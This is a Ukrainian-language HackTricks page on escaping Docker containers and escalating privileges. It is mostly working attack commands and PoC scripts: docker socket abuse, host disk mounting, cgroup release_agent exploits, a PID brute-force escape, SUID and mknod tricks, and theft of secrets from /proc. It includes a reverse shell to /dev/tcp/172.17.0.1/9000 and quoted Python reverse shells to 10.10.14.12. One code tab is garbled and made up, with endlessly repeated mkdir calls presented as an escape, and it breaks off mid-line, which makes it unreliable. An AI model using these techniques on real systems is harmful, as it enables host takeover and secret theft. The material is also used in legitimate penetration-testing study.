# Втеча з Docker / Підвищення привілеїв

<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Інші способи підтримки HackTricks:

* Якщо ви хочете побачити вашу **компанію рекламовану на HackTricks** або **завантажити HackTricks у форматі PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) **і** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **репозиторіїв**.

</details>

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Використовуйте [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), щоб легко створювати та **автоматизувати робочі процеси** за допомогою найбільш **продвинутих** інструментів спільноти у світі.\
Отримайте доступ сьогодні:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Автоматичне перелічення та втеча

* [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): Він також може **перелічити контейнери**
* [**CDK**](https://github.com/cdk-team/CDK#installationdelivery): Цей інструмент досить **корисний для переліку контейнера, в якому ви знаходитесь, навіть спробуйте втечу автоматично**
* [**amicontained**](https://github.com/genuinetools/amicontained): Корисний інструмент для отримання привілеїв, які має контейнер, щоб знайти способи втечі з нього
* [**deepce**](https://github.com/stealthcopter/deepce): Інструмент для переліку та втечі з контейнерів
* [**grype**](https://github.com/anchore/grype): Отримайте CVE, які містяться в програмному забезпеченні, встановленому в зображенні

## Втеча через підключений Docker Socket

Якщо ви якимось чином виявите, що **сокет Docker підключений** всередині контейнера Docker, ви зможете втекти з нього.\
Це зазвичай трапляється в контейнерах Docker, які з якоїсь причини потребують підключення до демона Docker для виконання дій.
```bash
#Search the socket
find / -name docker.sock 2>/dev/null
#It's usually in /run/docker.sock
```
У цьому випадку ви можете використовувати звичайні команди docker для взаємодії з демоном docker:
```bash
#List images to use one
docker images
#Run the image mounting the host disk and chroot on it
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash

# Get full access to the host via ns pid and nsenter cli
docker run -it --rm --pid=host --privileged ubuntu bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# Get full privs in container without --privileged
docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
```
{% hint style="info" %}
У випадку, якщо **сокет docker знаходиться в неочікуваному місці**, ви все ще можете спілкуватися з ним, використовуючи команду **`docker`** з параметром **`-H unix:///path/to/docker.sock`**
{% endhint %}

Демон Docker також може [слухати порт (за замовчуванням 2375, 2376)](../../../../network-services-pentesting/2375-pentesting-docker.md) або на системах на основі Systemd, комунікація з демоном Docker може відбуватися через сокет Systemd `fd://`.

{% hint style="info" %}
Додатково, зверніть увагу на сокети виконання інших високорівневих середовищ виконання:

* dockershim: `unix:///var/run/dockershim.sock`
* containerd: `unix:///run/containerd/containerd.sock`
* cri-o: `unix:///var/run/crio/crio.sock`
* frakti: `unix:///var/run/frakti.sock`
* rktlet: `unix:///var/run/rktlet.sock`
* ...
{% endhint %}

## Втеча від зловживання можливостями

Вам слід перевірити можливості контейнера, якщо він має будь-які з наступних, ви, можливо, зможете втекти з нього: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`, `CAP_SYSLOG`, `CAP_NET_RAW`, `CAP_NET_ADMIN`**

Ви можете перевірити поточні можливості контейнера, використовуючи **зазначені раніше автоматичні інструменти** або:
```bash
capsh --print
```
На наступній сторінці ви можете **дізнатися більше про можливості Linux** та як їх зловживати для втечі/підвищення привілеїв:

{% content-ref url="../../linux-capabilities.md" %}
[linux-capabilities.md](../../linux-capabilities.md)
{% endcontent-ref %}

## Втеча з привілейованих контейнерів

Привілейований контейнер можна створити з прапорцем `--privileged` або вимкненням конкретних захистів:

* `--cap-add=ALL`
* `--security-opt apparmor=unconfined`
* `--security-opt seccomp=unconfined`
* `--security-opt label:disable`
* `--pid=host`
* `--userns=host`
* `--uts=host`
* `--cgroupns=host`
* `Mount /dev`

Прапорець `--privileged` значно знижує безпеку контейнера, пропонуючи **необмежений доступ до пристроїв** та обхід **кількох захистів**. Для докладного розбору дивіться документацію щодо повного впливу `--privileged`.

{% content-ref url="../docker-privileged.md" %}
[docker-privileged.md](../docker-privileged.md)
{% endcontent-ref %}

### Привілейований + hostPID

З цими дозволами ви можете просто **перейти до простору імен процесу, що працює на хості як root**, наприклад init (pid:1), просто виконавши: `nsenter --target 1 --mount --uts --ipc --net --pid -- bash`

Перевірте це в контейнері, виконавши:
```bash
docker run --rm -it --pid=host --privileged ubuntu bash
```
### Привілейований

Лише з прапорцем privileged ви можете спробувати **отримати доступ до диска хоста** або спробувати **втекти, зловживаючи release\_agent або інші втечі**.

Перевірте наступні обхідні шляхи в контейнері, виконавши:
```bash
docker run --rm -it --privileged ubuntu bash
```
#### Підключення диска - Poc1

Налаштовані належним чином контейнери Docker не дозволять виконати команду, таку як **fdisk -l**. Однак на неправильно налаштованій команді Docker, де вказано прапорці `--privileged` або `--device=/dev/sda1` з правами, можливо отримати привілеї для перегляду диска хоста.

![](https://bestestredteam.com/content/images/2019/08/image-16.png)

Таким чином, для захоплення хост-машини це тривіально:
```bash
mkdir -p /mnt/hola
mount /dev/sda1 /mnt/hola
```
І ось! Тепер ви можете отримати доступ до файлової системи хоста, оскільки вона змонтована в папці `/mnt/hola`.

#### Монтування диска - Poc2

У межах контейнера зловмисник може спробувати отримати додатковий доступ до основної операційної системи хоста за допомогою записного тома hostPath, створеного кластером. Нижче наведено деякі загальні речі, які ви можете перевірити у межах контейнера, щоб побачити, чи використовуєте ви цей вектор атаки:
```bash
### Check if You Can Write to a File-system
echo 1 > /proc/sysrq-trigger

### Check root UUID
cat /proc/cmdline
BOOT_IMAGE=/boot/vmlinuz-4.4.0-197-generic root=UUID=b2e62f4f-d338-470e-9ae7-4fc0e014858c ro console=tty1 console=ttyS0 earlyprintk=ttyS0 rootdelay=300

# Check Underlying Host Filesystem
findfs UUID=<UUID Value>
/dev/sda1

# Attempt to Mount the Host's Filesystem
mkdir /mnt-test
mount /dev/sda1 /mnt-test
mount: /mnt: permission denied. ---> Failed! but if not, you may have access to the underlying host OS file-system now.

### debugfs (Interactive File System Debugger)
debugfs /dev/sda1
```
#### Привілейований вихід за допомогою існуючого release\_agent ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC1

{% code title="Початковий PoC" %}
```bash
# spawn a new container to exploit via:
# docker run --rm -it --privileged ubuntu bash

# Finds + enables a cgroup release_agent
# Looks for something like: /sys/fs/cgroup/*/release_agent
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
# If "d" is empty, this won't work, you need to use the next PoC

# Enables notify_on_release in the cgroup
mkdir -p $d/w;
echo 1 >$d/w/notify_on_release
# If you have a "Read-only file system" error, you need to use the next PoC

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
t=`sed -n 's/overlay \/ .*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
touch /o; echo $t/c > $d/release_agent

# Creates a payload
echo "#!/bin/sh" > /c
echo "ps > $t/o" >> /c
chmod +x /c

# Triggers the cgroup via empty cgroup.procs
sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1

# Reads the output
cat /o
```
{% endcode %}

#### Привілейований вихід за допомогою створеного release\_agent ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2

{% code title="Другий PoC" %}
```bash
# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash

# Mounts the RDMA cgroup controller and create a child cgroup
# This technique should work with the majority of cgroup controllers
# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"
# It's because your setup doesn't have the RDMA cgroup controller, try change rdma to memory to fix it
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
# If mount gives an error, this won't work, you need to use the first PoC

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#For a normal PoC =================
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#===================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/172.17.0.1/9000 0>&1" >> /cmd
chmod a+x /cmd
#===================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
# By creating a /bin/sh process and writing its PID to the cgroup.procs file in "x" child cgroup directory
# The script on the host will execute after /bin/sh exits
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```
{% endcode %}

Знайдіть **пояснення техніки** за посиланням:

{% content-ref url="docker-release_agent-cgroups-escape.md" %}
[docker-release\_agent-cgroups-escape.md](docker-release\_agent-cgroups-escape.md)
{% endcontent-ref %}

#### Привілейоване втеча, використовуючи release\_agent без знання відносного шляху - PoC3

У попередніх вразливостях **відкритий абсолютний шлях контейнера в файловій системі хоста**. Однак це не завжди так. У випадках, коли ви **не знаєте абсолютний шлях контейнера в хості**, ви можете використовувати цю техніку:

{% content-ref url="release_agent-exploit-relative-paths-to-pids.md" %}
[release\_agent-exploit-relative-paths-to-pids.md](release\_agent-exploit-relative-paths-to-pids.md)
{% endcontent-ref %}
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
Виконання PoC у привілейованому контейнері повинно надати вивід, схожий на:
```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```
#### Привілейоване уникнення за допомогою чутливих монтажів

Існує кілька файлів, які можуть бути змонтовані та надавати **інформацію про базовий хост**. Деякі з них можуть навіть вказувати на **щось, що повинно виконуватися хостом при виникненні певної події** (що дозволить зловмиснику вийти з контейнера).\
Зловживання цими файлами може дозволити:

* release\_agent (вже розглянуто раніше)
* [binfmt\_misc](sensitive-mounts.md#proc-sys-fs-binfmt\_misc)
* [core\_pattern](sensitive-mounts.md#proc-sys-kernel-core\_pattern)
* [uevent\_helper](sensitive-mounts.md#sys-kernel-uevent\_helper)
* [modprobe](sensitive-mounts.md#proc-sys-kernel-modprobe)

Однак ви можете знайти **інші чутливі файли**, які варто перевірити на цій сторінці:

{% content-ref url="sensitive-mounts.md" %}
[sensitive-mounts.md](sensitive-mounts.md)
{% endcontent-ref %}

### Довільні монтажі

У декількох випадках ви можете виявити, що **контейнер має деякий обсяг, змонтований з хоста**. Якщо цей обсяг не був належним чином налаштований, ви можете мати можливість **отримати/змінити чутливі дані**: читати секрети, змінювати ssh authorized\_keys...
```bash
docker run --rm -it -v /:/host ubuntu bash
```
### Підвищення привілеїв за допомогою 2 оболонок та монтування хоста

Якщо у вас є доступ як **root всередині контейнера**, в якому монтується деяка папка з хоста, і ви **вийшли як не привілейований користувач на хост**, і маєте доступ на читання до змонтованої папки.\
Ви можете створити **bash suid файл** в **змонтованій папці** всередині **контейнера** і **виконати його з хоста** для підвищення привілеїв.
```bash
cp /bin/bash . #From non priv inside mounted folder
# You need to copy it from the host as the bash binaries might be diferent in the host and in the container
chown root:root bash #From container as root inside mounted folder
chmod 4777 bash #From container as root inside mounted folder
bash -p #From non priv inside mounted folder
```
### Підвищення привілеїв за допомогою 2 оболонок

Якщо у вас є доступ як **root всередині контейнера** і ви **вибралися як не привілейований користувач на хості**, ви можете зловживати обома оболонками для **підвищення привілеїв всередині хоста**, якщо у вас є можливість MKNOD всередині контейнера (це за замовчуванням), як пояснено в цьому [**пості**](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/).\
З такою можливістю користувач root всередині контейнера може **створювати файли блочних пристроїв**. Файли пристроїв - це спеціальні файли, які використовуються для **доступу до апаратного забезпечення та ядра**. Наприклад, файл блочного пристрою /dev/sda надає доступ до **читання сирої інформації на диску системи**.

Docker захищає від зловживання блочними пристроями всередині контейнерів, застосовуючи політику cgroup, яка **блокує операції читання/запису блочних пристроїв**. Однак, якщо блочний пристрій **створений всередині контейнера**, він стає доступним ззовні контейнера через каталог **/proc/PID/root/**. Для цього доступу потрібно, щоб **власник процесу був однаковим** як всередині, так і ззовні контейнера.

Приклад **експлуатації** з цього [**опису**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/):
```bash
# On the container as root
cd /
# Crate device
mknod sda b 8 0
# Give access to it
chmod 777 sda

# Create the nonepriv user of the host inside the container
## In this case it's called augustus (like the user from the host)
echo "augustus:x:1000:1000:augustus,,,:/home/augustus:/bin/bash" >> /etc/passwd
# Get a shell as augustus inside the container
su augustus
su: Authentication failure
(Ignored)
augustus@3a453ab39d3d:/backend$ /bin/sh
/bin/sh
$
```

```bash
# On the host

# get the real PID of the shell inside the container as the new https://app.gitbook.com/s/-L_2uGJGU7AVNRcqRvEi/~/changes/3847/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#privilege-escalation-with-2-shells user
augustus@GoodGames:~$ ps -auxf | grep /bin/sh
root      1496  0.0  0.0   4292   744 ?        S    09:30   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
root      1627  0.0  0.0   4292   756 ?        S    09:44   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
augustus  1659  0.0  0.0   4292   712 ?        S+   09:48   0:00                          \_ /bin/sh
augustus  1661  0.0  0.0   6116   648 pts/0    S+   09:48   0:00              \_ grep /bin/sh

# The process ID is 1659 in this case
# Grep for the sda for HTB{ through the process:
augustus@GoodGames:~$ grep -a 'HTB{' /proc/1659/root/sda
HTB{7h4T_w45_Tr1cKy_1_D4r3_54y}
```
### hostPID

Якщо ви можете отримати доступ до процесів хоста, ви зможете отримати доступ до багато чутливої інформації, збереженої в цих процесах. Запустіть тестову лабораторію:
```
docker run --rm -it --pid=host ubuntu bash
```
Наприклад, ви зможете переглянути список процесів за допомогою чогось на зразок `ps auxn` та шукати чутливі дані в командах.

Потім, оскільки ви можете **отримати доступ до кожного процесу хоста в /proc/, ви можете просто вкрасти їхні секрети env**, запустивши:
```bash
for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done
/proc/988058/environ
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOSTNAME=argocd-server-69678b4f65-6mmql
USER=abrgocd
...
```
Ви також можете **отримати доступ до файлових дескрипторів інших процесів та прочитати їх відкриті файли**:
```bash
for fd in `find /proc/*/fd`; do ls -al $fd/* 2>/dev/null | grep \>; done > fds.txt
less fds.txt
...omitted for brevity...
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/2 -> /dev/pts/0
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/4 -> /.secret.txt.swp
# You can open the secret filw with:
cat /proc/635813/fd/4
```
Ви також можете **завершувати процеси та спричиняти DoS**.

{% hint style="warning" %}
Якщо ви якимось чином маєте привілейований **доступ до процесу поза контейнером**, ви можете запустити щось на кшталт `nsenter --target <pid> --all` або `nsenter --target <pid> --mount --net --pid --cgroup` для **запуску оболонки з тими ж обмеженнями ns** (сподіваємося, ні) **як у тому процесі.**
{% endhint %}

### hostNetwork
```
docker run --rm -it --network=host ubuntu bash
```
Якщо контейнер був налаштований з допомогою драйвера мережі Docker [host (`--network=host`)](https://docs.docker.com/network/host/), стек мережі цього контейнера не ізольований від хоста Docker (контейнер ділиться простором імен мережі хоста), і контейнер не отримує власну IP-адресу. Іншими словами, **контейнер прив'язує всі служби безпосередньо до IP-адреси хоста**. Крім того, контейнер може **перехоплювати ВСІ мережовий трафік, який хост** відправляє та отримує на спільному інтерфейсі `tcpdump -i eth0`.

Наприклад, це можна використовувати для **перехоплення та навіть підробки трафіку** між хостом та екземпляром метаданих.

Як у наступних прикладах:

* [Опис: Як зв'язатися з Google SRE: Зброшення оболонки в хмарну SQL](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
* [MITM сервісу метаданих дозволяє підвищення привілеїв root (EKS / GKE)](https://blog.champtar.fr/Metadata\_MITM\_root\_EKS\_GKE/)

Ви також зможете отримати доступ до **мережевих служб, прив'язаних до localhost** всередині хоста або навіть отримати доступ до **дозволів метаданих вузла** (які можуть відрізнятися від тих, які може отримати контейнер).

### hostIPC
```bash
docker run --rm -it --ipc=host ubuntu bash
```
З `hostIPC=true` ви отримуєте доступ до ресурсів міжпроцесної комунікації (IPC) хоста, таких як **спільна пам'ять** в `/dev/shm`. Це дозволяє читати/писати там, де ті самі ресурси IPC використовуються іншими процесами хоста або підпроцесами. Використовуйте `ipcs`, щоб докладніше дослідити ці механізми IPC.

* **Огляд /dev/shm** - Шукайте файли в цьому місці спільної пам'яті: `ls -la /dev/shm`
* **Огляд існуючих засобів IPC** - Ви можете перевірити, чи використовуються які-небудь засоби IPC за допомогою `/usr/bin/ipcs`. Перевірте це за допомогою: `ipcs -a`

### Відновлення можливостей

Якщо системний виклик **`unshare`** не заборонено, ви можете відновити всі можливості, запустивши:
```bash
unshare -UrmCpf bash
# Check them with
cat /proc/self/status | grep CapEff
```
### Зловживання простором користувача через символічні посилання

Друга техніка, пояснена в пості [https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/), показує, як ви можете зловживати прив'язками монтування з просторами користувачів, щоб впливати на файли всередині хоста (у цьому конкретному випадку - видаляти файли).

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Використовуйте [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), щоб легко створювати та **автоматизувати робочі процеси**, які працюють на основі найбільш **продвинутих** інструментів спільноти у світі.\
Отримайте доступ сьогодні:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## CVEs

### Використання уразливості Runc (CVE-2019-5736)

У випадку, якщо ви можете виконати `docker exec` як root (імовірно, з sudo), ви можете спробувати підняти привілеї, вибравши втечу з контейнера, зловживаючи CVE-2019-5736 (експлойт [тут](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)). Ця техніка в основному **перезапише** бінарний файл _**/bin/sh**_ **хоста** **з контейнера**, тому будь-хто, хто виконує docker exec, може викликати вразливість.

Змініть навантаження відповідно та скомпілюйте main.go за допомогою `go build main.go`. Отриманий бінарний файл слід розмістити в контейнері Docker для виконання.\
Після виконання, як тільки відобразиться `[+] Overwritten /bin/sh successfully`, вам потрібно виконати наступне з хост-машини:

`docker exec -it <container-name> /bin/sh`

Це викличе навантаження, яке присутнє у файлі main.go.

Для отримання додаткової інформації: [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)

{% hint style="info" %}
Є інші CVE, на які контейнер може бути вразливим, ви можете знайти список за посиланням [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list)
{% endhint %}

## Власна втеча з Docker

### Поверхня втечі Docker

* **Простори імен:** Процес повинен бути **повністю відокремлений від інших процесів** за допомогою просторів імен, тому ми не можемо втекти взаємодіючи з іншими процесами через простори імен (за замовчуванням не можна спілкуватися через IPC, unix сокети, мережеві служби, D-Bus, `/proc` інших процесів).
* **Користувач root**: За замовчуванням користувач, який запускає процес, є користувачем root (проте його привілеї обмежені).
* **Можливості**: Docker залишає наступні можливості: `cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep`
* **Syscalls**: Це syscalls, які **користувач root не зможе викликати** (через відсутність можливостей + Seccomp). Інші syscalls можуть бути використані для спроби втечі.

{% tabs %}
{% tab title="x64 syscalls" %}
```yaml
0x067 -- syslog
0x070 -- setsid
0x09b -- pivot_root
0x0a3 -- acct
0x0a4 -- settimeofday
0x0a7 -- swapon
0x0a8 -- swapoff
0x0aa -- sethostname
0x0ab -- setdomainname
0x0af -- init_module
0x0b0 -- delete_module
0x0d4 -- lookup_dcookie
0x0f6 -- kexec_load
0x12c -- fanotify_init
0x130 -- open_by_handle_at
0x139 -- finit_module
0x140 -- kexec_file_load
0x141 -- bpf
```
{% endtab %}

{% tab title="arm64 виклики системи" %}
```
0x029 -- pivot_root
0x059 -- acct
0x069 -- init_module
0x06a -- delete_module
0x074 -- syslog
0x09d -- setsid
0x0a1 -- sethostname
0x0a2 -- setdomainname
0x0aa -- settimeofday
0x0e0 -- swapon
0x0e1 -- swapoff
0x106 -- fanotify_init
0x109 -- open_by_handle_at
0x111 -- finit_module
0x118 -- bpf
```
{% endtab %}

{% tab title="syscall_bf.c" %} 
## Втеча з Docker контейнера

Цей код використовує низькорівневі системні виклики для втечі з Docker контейнера та отримання привілеїв користувача на хост-системі.

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/syscall.h>

#define __NR_mkdir 39

int main() {
    syscall(__NR_mkdir, "/tmp/root", 0755);
    chdir("/tmp/root");
    syscall(__NR_mkdir, "dev", 0755);
    syscall(__NR_mkdir, "pts", 0755);
    syscall(__NR_mkdir, "shm", 0755);
    syscall(__NR_mkdir, "mqueue", 0755);
    syscall(__NR_mkdir, "net", 0755);
    syscall(__NR_mkdir, "proc", 0755);
    syscall(__NR_mkdir, "sys", 0755);
    syscall(__NR_mkdir, "cgroup", 0755);
    syscall(__NR_mkdir, "selinux", 0755);
    syscall(__NR_mkdir, "apparmor", 0755);
    syscall(__NR_mkdir, "overlay", 0755);
    syscall(__NR_mkdir, "aufs", 0755);
    syscall(__NR_mkdir, "overlay2", 0755);
    syscall(__NR_mkdir, "lxc", 0755);
    syscall(__NR_mkdir, "lxcfs", 0755);
    syscall(__NR_mkdir, "docker", 0755);
    syscall(__NR_mkdir, "docker-sock", 0755);
    syscall(__NR_mkdir, "containerd", 0755);
    syscall(__NR_mkdir, "runc", 0755);
    syscall(__NR_mkdir, "containerd-sock", 0755);
    syscall(__NR_mkdir, "runc-sock", 0755);
    syscall(__NR_mkdir, "containerd-shim", 0755);
    syscall(__NR_mkdir, "containerd-shim-sock", 0755);
    syscall(__NR_mkdir, "containerd-shim-run", 0755);
    syscall(__NR_mkdir, "containerd-shim-run-sock", 0755);
    syscall(__NR_mkdir, "containerd-shim-run-data", 0755);
    syscall(__NR_mkdir, "containerd-shim-run-data-sock", 0755);
    syscall(__NR_mkdir, "containerd-shim-run-data-root", 0755);
    syscall(__NR_mkdir, "containerd-shim-run-data-root-sock", 0755);
    syscall(__NR_mkdir, "containerd-shim-run-data-root-sock-sock", 0755);
    syscall(__NR_mkdir, "containerd-shim-run-data-root-sock-sock-sock", 0755);
    syscall(__NR_mkdir, "containerd-shim-run-data-root-sock-sock-sock-sock", 0755);
    syscall(__NR_mkdir, "containerd-shim-run-data-root-sock-sock-sock-sock-sock", 0755);
    syscall(__NR_mkdir, "containerd-shim-run-data-root-sock-sock-sock-sock-sock-sock", 0755);
    syscall(__NR_mkdir, "containerd-shim-run-data-root-sock-sock-sock-sock-sock-sock-sock", 0755);
    syscall(__NR_mkdir, "containerd-shim-run-data-root-sock-sock-sock-sock-sock-sock-sock-sock", 0755);
    syscall(__NR_mkdir, "containerd-shim-run-data-root-sock-sock-sock-sock-sock-sock-sock-sock-sock", 0755);
    syscall(__NR_mkdir, "containerd-shim-run-data-root-sock-sock-sock-sock-sock-sock-sock-sock-sock-sock", 0755);
    syscall(__NR_mkdir, "containerd-shim-run-data-root-sock-sock-sock-sock-sock-sock-sock-sock-sock-sock-sock", 0755);
    syscall(__NR_mkdir, "containerd-shim-run-data-root-sock-sock-sock-sock-sock-sock-sock-sock-sock-sock-sock-sock", 0755);
    syscall(__NR_mkdir, "containerd-shim-run-data-root-sock-sock-sock-sock-sock-sock-sock-sock-sock-sock-sock-sock-sock", 0755);
    syscall(__NR_mkdir, "containerd-shim-run-data-root-sock-sock-sock-sock-sock-sock-sock-sock-sock-sock-sock-sock-sock-sock", 0755);
    syscall(__NR_mkdir, "containerd-shim-run-data-root-sock-sock-sock-sock-sock-sock-sock-sock-sock
````c
// From a conversation I had with @arget131
// Fir bfing syscalss in x64

#include <sys/syscall.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>

int main()
{
for(int i = 0; i < 333; ++i)
{
if(i == SYS_rt_sigreturn) continue;
if(i == SYS_select) continue;
if(i == SYS_pause) continue;
if(i == SYS_exit_group) continue;
if(i == SYS_exit) continue;
if(i == SYS_clone) continue;
if(i == SYS_fork) continue;
if(i == SYS_vfork) continue;
if(i == SYS_pselect6) continue;
if(i == SYS_ppoll) continue;
if(i == SYS_seccomp) continue;
if(i == SYS_vhangup) continue;
if(i == SYS_reboot) continue;
if(i == SYS_shutdown) continue;
if(i == SYS_msgrcv) continue;
printf("Probando: 0x%03x . . . ", i); fflush(stdout);
if((syscall(i, NULL, NULL, NULL, NULL, NULL, NULL) < 0) && (errno == EPERM))
printf("Error\n");
else
printf("OK\n");
}
}
```

````
{% endtab %}
{% endtabs %}

### Container Breakout through Usermode helper Template

If you are in **userspace** (**no kernel exploit** involved) the way to find new escapes mainly involve the following actions (these templates usually require a container in privileged mode):

* Find the **path of the containers filesystem** inside the host
